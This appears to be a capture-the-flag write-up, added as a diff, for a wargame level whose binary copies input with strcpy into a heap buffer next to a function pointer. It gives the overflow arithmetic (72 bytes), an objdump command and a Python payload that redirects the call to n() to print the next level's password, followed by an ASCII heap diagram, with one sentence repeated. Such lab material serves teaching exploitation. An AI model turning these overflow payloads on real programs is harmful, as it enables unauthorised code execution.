@@ -1,0 +1,66 @@
+Goal: overwrite the heap function pointer to call `n()` and print the level7 password.
+
+Observation:
+- `buf = malloc(0x40)` and `fn = malloc(4)` are adjacent heap chunks.
+- `strcpy(buf, argv[1])` has no bounds check, so it can overflow into `fn`.
+- `(*fn)()` is called after the copy.
+
+Heap layout (32-bit glibc):
+buf chunk: [8-byte header][64 bytes user data]
+fn chunk:  [8-byte header][4 bytes user data (function pointer)]
+
+So the overwrite distance to reach `fn` is:
+64 (buf) + 8 (next chunk header) = 72 bytes.
+
+Steps:
+1) Find `n()` address:
+	objdump -d /home/user/level6/level6 | grep "<n>"
+2) Build payload: 72 bytes of padding + address of `n()` (little-endian).
+3) Execute:
+	/home/user/level6/level6 "$(python2 - <<'PY'
+	import struct
+	n_addr = 0x08048454  # replace with actual `n()` address
+	print "A"*72 + struct.pack("<I", n_addr)
+	PY
+	)"
+4) The program calls `n()` and prints the level7 password.
+
+Result:
+- The command prints the level7 password, stored in the flag file.
+
+
+
+
+how the heap in ram can you give me exmaple to visual what happen
+
+Here’s a simple visual of how the heap looks right after the two mallocs, and why 72 bytes reaches the function pointer.
+
+Heap layout (32‑bit glibc):
+Address →
+┌──────────────────────────────┐
+│ buf chunk header (8 bytes)   │  <-- metadata
+├──────────────────────────────┤
+│ buf user data (64 bytes)     │  <-- buf points here
+│ 0x40 bytes                   │
+├──────────────────────────────┤
+│ fn chunk header (8 bytes)    │  <-- metadata for next chunk
+├──────────────────────────────┤
+│ fn user data (4 bytes)       │  <-- fn points here (function pointer)
+└──────────────────────────────┘
+
+
+
+So when you send input:
+"A" * 72  +  address_of_n
+
+
+
+So when you send input:
+
+It lands like this:
+
+"A" * 64  -> fills buf
+"A" * 8   -> overwrites next chunk header
+next 4    -> overwrites fn pointer
+
+That’s the exact reason for 64 + 8 = 72.
